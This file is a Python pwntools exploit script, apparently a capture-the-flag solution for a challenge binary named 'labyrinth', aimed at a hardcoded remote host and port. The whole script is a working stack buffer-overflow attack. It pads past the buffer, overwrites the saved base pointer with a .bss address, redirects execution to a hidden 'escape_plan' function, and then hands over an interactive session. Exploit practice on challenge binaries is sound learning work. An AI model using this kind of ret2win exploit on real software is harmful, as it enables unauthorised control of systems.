from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./labyrinth"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("94.237.54.145", 51174)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io.sendlineafter(">> ", "69")

bss = 0x200 + 0x404010
escape_plan = 0x040125D
payload = b"a"*0x30 + p64(bss) + p64(escape_plan)
ddebug("break *0x04015DA\n continue")
io.sendlineafter(">> ", payload)

io.interactive()
